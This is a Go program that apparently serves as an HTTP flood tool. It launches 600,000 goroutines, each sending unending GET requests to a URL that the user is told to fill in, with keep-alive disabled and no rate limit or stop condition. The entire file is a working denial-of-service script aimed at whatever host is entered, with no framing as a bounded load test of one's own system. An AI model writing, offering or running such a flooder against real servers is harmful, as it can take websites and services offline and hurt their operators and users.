package main

import (
	"fmt"
	"net/http"
	"sync"
)

const (
	url        = "http://localhost:8000" //this is the URL / host you put in
	numThreads = 600000                  //number of threads
)

func sendRequest(wg *sync.WaitGroup, client *http.Client) {
	defer wg.Done()

	var counter int
	for {
		// Create a non-blocking HTTP request
		req, err := http.NewRequest("GET", url, nil)
		if err != nil {
			fmt.Printf("Error creating request - %v\n", err)
			continue
		}

		// Send the request and capture the response
		resp, err := client.Do(req)
		if err != nil {
			fmt.Printf("Error sending request - %v\n", err)
			continue
		}

		// Print the response status code and request count
		counter++
		fmt.Printf("Response %d status code: %d\n", counter, resp.StatusCode)

		// Close the response body to prevent resource leaks
		resp.Body.Close()
	}
}

func main() {
	// Create a WaitGroup to wait for all threads to finish
	var wg sync.WaitGroup

	// Create a non-blocking HTTP client
	client := &http.Client{
		Transport: &http.Transport{
			DisableKeepAlives: true, // Disable keep-alive to prevent reusing connections
		},
	}

	// Add threads to WaitGroup
	for i := 0; i < numThreads; i++ {
		wg.Add(1)
		go sendRequest(&wg, client)
	}

	// Wait for all threads to finish
	wg.Wait()
}
